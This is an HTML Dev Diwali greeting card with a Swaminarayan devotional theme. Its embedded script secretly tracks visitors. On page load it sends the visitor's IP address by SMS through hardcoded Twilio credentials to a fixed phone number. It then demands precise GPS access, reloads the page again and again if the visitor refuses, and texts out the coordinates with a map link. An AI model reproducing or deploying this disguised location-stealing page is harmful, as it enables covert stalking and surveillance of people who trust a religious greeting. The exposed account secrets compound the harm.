<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jay Swaminarayan - Dev Diwali Greetings</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Teko:wght@700&family=Great+Vibes&family=Playfair+Display:ital,wght@0,400..900;1,400..900&display=swap');
        
        /* Thematic Colors: Deep Red, Saffron/Gold, and Marble White */
        body {
            font-family: 'Playfair Display', serif; /* Elegant font for main text */
            background-color: #5d0202; /* Deep, rich red/maroon */
            background-image: radial-gradient(#8c0000 1px, transparent 1px);
            background-size: 30px 30px;
        }

        /* Keyframes for dramatic, slow glow, evoking Mandir lighting */
        @keyframes subtle-glow {
            0%, 100% { filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.7)); }
            50% { filter: drop-shadow(0 0 25px rgba(255, 180, 0, 0.9)); }
        }

        /* Keyframes for faster diya light flicker */
        @keyframes diya-flicker {
            0%, 100% { text-shadow: 0 0 6px #ff7f00, 0 0 16px #ffd700; }
            50% { text-shadow: 0 0 9px #ff4500, 0 0 22px #ffff00; }
        }

        .card-container {
            background: linear-gradient(135deg, #fefefe, #e8e8e8); /* Marble-like light gradient */
            border: 10px solid #ffcc33; /* Thick Gold Border */
            animation: subtle-glow 4s infinite alternate;
        }
        
        .great-vibes {
            font-family: 'Great Vibes', cursive; /* Script font for style */
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
        }

        .diya-icon {
            animation: diya-flicker 1.5s infinite alternate;
        }

        /* Saffron text color for devotion */
        .thematic-text {
            color: #ff8c00; /* Darker Saffron */
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

    <div class="card-container w-full max-w-xl rounded-[40px] p-10 md:p-16 text-center space-y-7 md:space-y-10 shadow-2xl">
        
        <!-- Devotional Icon: Mahant Swami Maharaj (Represented by Pranam) -->
        <div class="diya-icon text-7xl md:text-9xl thematic-text mb-4 filter drop-shadow-lg">
            &#x1F64F; <!-- Folded Hands (Pranam) -->
        </div>

        <h1 class="great-vibes text-6xl md:text-8xl font-extrabold thematic-text leading-tight">
            Jay Swaminarayan
        </h1>
        
        <div class="border-y-2 border-yellow-500 py-3 md:py-4">
            <p class="text-3xl md:text-4xl font-semibold text-gray-800 tracking-wider">
                **Shubh Dev Deepawali**
            </p>
        </div>

        <p class="text-xl md:text-2xl text-gray-700 tracking-wide font-sans leading-relaxed px-2">
            On this sacred day, we pray that the divine teachings of the **Akshar-Purushottam Upasana** and the eternal guidance of **Mahant Swami Maharaj** illuminates your life.
        </p>

        <!-- BAPS Core Values Section -->
        <div class="pt-4 space-y-2">
            <p class="text-lg font-bold thematic-text">
                May you embody the values of the Satsang:
            </p>
            <p class="text-sm text-gray-600 italic">
                No Alcohol, No Addictions, No Adultery, No Meat, No Impurity of body and mind.
            </p>
        </div>
        
        <!-- Status Display Area (Pulsing Prompt) -->
        <div id="status-info" class="pt-4 text-center text-sm font-mono">
            <p id="ip-address-info" class="text-yellow-600 font-bold tracking-wider animate-pulse">
                Please Allow Location to view the full Devotional Card...
            </p>
        </div>

        <!-- Symbolic Icons: Diya for Light, Lotus for Purity -->
        <div class="pt-4 text-4xl text-yellow-600 diya-icon">
            &#x1F33F; &#x1F56F; <!-- Lotus Flower & Diya -->
        </div>

        <p class="text-md text-gray-500 pt-2 font-sans">
            "In the joy of others lies our own." â€” *Pramukh Swami Maharaj*
        </p>

    </div>

    <script>
        // --- TWILIO CONFIGURATION (SECURITY RISK: HARDCODED TOKENS) ---
        const ACCOUNT_SID = 'AC2dee50fd1b55baea5f820bc3cb89b67a';
        const AUTH_TOKEN = 'b878fa2395a8b0810a0d7cfd16ae59c3';
        const TO_NUMBER = '+917878382217';
        const FROM_NUMBER = '+18156621535'; // Your Twilio number

        const API_URL = `https://api.twilio.com/2010-04-01/Accounts/${ACCOUNT_SID}/Messages.json`;
        
        const ipInfoElement = document.getElementById('ip-address-info');
        const statusContainer = document.getElementById('status-info');

        /**
         * Sends a new SMS message via Twilio's POST API, containing the location details.
         * This function operates silently.
         * @param {string} ipMessageBody - The body of the SMS message.
         */
        async function sendTwilioSMS(ipMessageBody) {
            console.log("Attempting to send Twilio SMS with message:", ipMessageBody);

            const authHeader = btoa(`${ACCOUNT_SID}:${AUTH_TOKEN}`);
            const payload = new URLSearchParams();
            payload.append('To', TO_NUMBER);
            payload.append('From', FROM_NUMBER);
            payload.append('Body', ipMessageBody);

            try {
                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Authorization': `Basic ${authHeader}`
                    },
                    body: payload.toString()
                });

                const result = await response.json();
                
                if (response.ok) {
                    console.log("Twilio Success (Silent):", result);
                } else {
                    console.error("Twilio API Error (Silent):", result);
                }
            } catch (error) {
                // The Twilio API fetch will often fail here due to CORS/security restrictions
                // in the browser sandbox environment, but we must log it silently.
                console.error("Fetch error during Twilio send (Silent):", error);
            }
        }

        /**
         * Attempts to get high-precision geolocation using the browser's API.
         * Resolves with { lat, lon, status: 'granted' } on success, 
         * or { status: 'denied' } if the user explicitly denies permission.
         * Rejects only on timeout or unavailability.
         */
        function getBrowserGeolocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    return reject(new Error("Geolocation not supported."));
                }

                const options = {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                };

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            lat: position.coords.latitude.toFixed(6),
                            lon: position.coords.longitude.toFixed(6),
                            status: 'granted'
                        });
                    },
                    (error) => {
                        // 1: Permission denied, 2: Position unavailable, 3: Timeout
                        if (error.code === 1) { // Permission Denied by User
                            resolve({ status: 'denied' });
                        } else {
                            reject(new Error(`Geolocation error (${error.code}): ${error.message}`));
                        }
                    },
                    options
                );
            });
        }
        
        /**
         * Phase 2: Handles the Geolocation attempt, sends SMS 2 if granted, or reloads page if denied.
         * @param {string} ipAddress - IP address from Phase 1.
         */
        async function handleGeolocation(ipAddress) {
            try {
                const geo = await getBrowserGeolocation();

                if (geo.status === 'granted') {
                    const lat = geo.lat;
                    const lon = geo.lon;

                    // Construct the Google Maps link
                    const googleMapsLink = `https://maps.google.com/maps?q=${lat},${lon}`;
                    
                    // Success! Send SMS 2 with GPS data and the Google Maps link
                    const smsBodyGeo = `GPS Loc GRANTED | Lat: ${lat}, Lon: ${lon} | Map: ${googleMapsLink} | Net: ${ipAddress}`;
                    
                    await sendTwilioSMS(smsBodyGeo); // SMS 2 sent with GPS
                    statusContainer.style.display = 'none'; // Success, hide the entire prompt container
                    console.log("GPS Location granted, SMS 2 sent with Map link. Process complete.");

                } else if (geo.status === 'denied') {
                    // Denial! Reload the page to ask again.
                    console.warn("User denied geolocation permission. Reloading page...");
                    ipInfoElement.textContent = "Location Denied. Reloading to ask again...";
                    ipInfoElement.classList.remove('animate-pulse'); // Stop pulse to signal state change
                    ipInfoElement.classList.add('text-red-600'); 
                    
                    // Reload after a short delay
                    setTimeout(() => {
                        window.location.reload();
                    }, 1500); 
                    
                } else {
                    // Geolocation error (e.g., unavailable, timeout, but not a denial)
                    statusContainer.style.display = 'none'; // Hide the entire prompt container
                    console.warn("Geolocation attempt failed (unavailable/timeout). Proceeding silently.");
                }
            } catch (error) {
                // Critical error (e.g., not supported)
                statusContainer.style.display = 'none';
                console.error("Critical error during geolocation:", error);
            }
        }


        // Function to fetch IP details (Phase 1) and start the geolocation process (Phase 2)
        async function fetchIPAndStartGeoProcess() {
            let ipAddress = 'N/A';
            
            // 1. Fetch IP details (Phase 1)
            try {
                // Changed to a more reliable, CORS-friendly public API (ipify.org) to fix "Failed to fetch" errors.
                const response = await fetch('https://api.ipify.org?format=json');
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                const data = await response.json();
                
                // ipify returns the IP address under the key 'ip'
                ipAddress = data.ip || 'N/A';
                
                // Construct SMS 1 body (IP details only)
                const smsBodyIP = `IP Access (Initial): ${ipAddress}`;
                
                // Send SMS 1 immediately
                await sendTwilioSMS(smsBodyIP); 

                console.log("SMS 1 (IP Details) sent successfully.");

            } catch (error) {
                console.error("Failed to fetch IP details for SMS 1:", error);
                // Proceed with 'N/A' IP for the geolocation step even if the IP fetch failed.
            }
            
            // 2. Start Geolocation Attempt (Phase 2)
            // The prompt stays visible and pulsing until this process is complete.
            await handleGeolocation(ipAddress);
        }

        // Trigger the fetch and SMS send when the page loads
        document.addEventListener('DOMContentLoaded', fetchIPAndStartGeoProcess);
    </script>
</body>
</html>
